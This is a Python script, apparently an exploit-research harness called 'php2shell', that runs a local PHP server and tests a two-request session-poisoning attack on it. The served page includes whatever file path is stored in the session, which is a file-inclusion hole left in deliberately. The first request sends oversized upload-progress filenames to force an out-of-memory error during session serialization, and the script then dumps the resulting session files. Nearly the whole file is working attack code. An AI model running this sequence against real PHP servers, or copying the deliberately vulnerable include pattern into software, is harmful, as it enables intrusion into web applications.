#!/usr/bin/env python3
"""php2shell lab harness: two-request BG(serialize) poison sequence.

Usage: python3 lab1.py <php-binary> [--mem 16M] [--files 20] [--fname-len 262144]
"""
import http.client, os, subprocess, sys, time, shutil, signal

LAB = os.path.expanduser("~/php2shell-lab")
HOST, PORT = "127.0.0.1", 8090

def build_multipart(sid: str, pkey: str, files: list[bytes], extra_fields: list[tuple[str, str]] = None) -> bytes:
    B = b""
    BOUND = b"----php2shellboundary"
    for name, value in (extra_fields or []):
        B += (f"--{BOUND.decode()}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n").encode()
    for i, fname in enumerate(files):
        B += (f"--{BOUND.decode()}\r\nContent-Disposition: form-data; name=\"f{i}\"; filename=\"{fname.decode(errors='surrogateescape')}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode())
        B += b"DATA\r\n"
    B += f"--{BOUND.decode()}--\r\n".encode()
    return B

def req(port: int, body: bytes) -> tuple[int, bytes]:
    c = http.client.HTTPConnection(HOST, port, timeout=30)
    c.request("POST", "/", body=body, headers={"Content-Type": "multipart/form-data; boundary=----php2shellboundary"})
    r = c.getresponse()
    data = r.read()
    c.close()
    return r.status, data

def main():
    php = sys.argv[1]
    mem = "16M"
    nfiles = 20
    fnlen = 262144  # 256 KB filenames
    for i, a in enumerate(sys.argv):
        if a == "--mem" and i + 1 < len(sys.argv): mem = sys.argv[i + 1]
        if a == "--files" and i + 1 < len(sys.argv): nfiles = int(sys.argv[i + 1])
        if a == "--fname-len" and i + 1 < len(sys.argv): fnlen = int(sys.argv[i + 1])

    web = f"{LAB}/webroot"
    shutil.rmtree(web, ignore_errors=True)
    os.makedirs(web, exist_ok=True)
    with open(f"{web}/index.php", "w") as f:
        f.write("<?php\nsession_start();\n"
                "if (isset($_SESSION['page'])) { include $_SESSION['page']; }\n"
                "else echo 'HOME-OK ' . PHP_VERSION . \"\\n\";\n")
    os.makedirs(f"{LAB}/sess", exist_ok=True)
    ini = f"{LAB}/lab.ini"
    with open(ini, "w") as f:
        f.write(f"memory_limit = {mem}\n"
                "session.upload_progress = On\n"
                "session.save_path = " + f"{LAB}/sess\n"
                "session.use_strict_mode = 0\n"
                "display_errors = 1\n"
                "max_execution_time = 60\n"
                "error_log = " + f"{LAB}/error.log\n")

    for f_ in os.listdir(f"{LAB}/sess"):
        os.unlink(f"{LAB}/sess/{f_}")
    open(f"{LAB}/error.log", "w").close()

    target = subprocess.Popen([php, "-S", f"{HOST}:{PORT}", "-t", web, "-c", ini],
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(0.7)

    # ---- Request 1: poison (20 x 256KB filenames -> ~5MB progress serialize -> OOM)
    fname = b"A" * fnlen
    body1 = build_multipart("pocsid1", "pk1", [fname] * nfiles,
                           extra_fields=[("PHPSESSID", "pocsid1"),
                                        ("PHP_SESSION_UPLOAD_PROGRESS", "pk1")])
    print(f"[R1] sending {len(body1)//1024} KB multipart ({nfiles} files x {fnlen//1024} KB names), mem={mem}")
    try:
        st1, d1 = req(PORT, body1)
        print(f"[R1] HTTP {st1}, body {len(d1)} bytes: {d1[:300]!r}")
    except Exception as e:
        print(f"[R1] ERROR: {e}")

    # ---- Request 2: trigger (small follow-up, fresh SID)
    body2 = build_multipart("pocsid2", "pk2", [b"smallfile.txt"],
                           extra_fields=[("PHPSESSID", "pocsid2"),
                                        ("PHP_SESSION_UPLOAD_PROGRESS", "pk2")])
    print(f"[R2] sending {len(body2)} bytes multipart (fresh sid, 1 small file)")
    try:
        st2, d2 = req(PORT, body2)
        print(f"[R2] HTTP {st2}, body {len(d2)} bytes: {d2[:300]!r}")
    except Exception as e:
        print(f"[R2] ERROR: {e}")

    # ---- Request 3: same sid2, check session contents
    try:
        st3, d3 = req(PORT, b"")
        print(f"[R3] HTTP {st3}: {d3[:200]!r}")
    except Exception as e:
        print(f"[R3] ERROR: {e}")

    time.sleep(0.3)
    target.send_signal(signal.SIGINT)
    try:
        out, _ = target.communicate(timeout=5)
    except subprocess.TimeoutExpired:
        target.kill()
        out, _ = target.communicate()
    print("=== PHP server output (tail) ===")
    print(out.decode(errors="replace")[-1500:])
    print("=== error.log (tail) ===")
    print(open(f"{LAB}/error.log").read()[-1500:])
    print("=== session files ===")
    for f_ in sorted(os.listdir(f"{LAB}/sess")):
        p = f"{LAB}/sess/{f_}"
        content = open(p, "rb").read()
        print(f"--- {f_} ({len(content)} bytes) ---")
        print(content[:600])

if __name__ == "__main__":
    main()
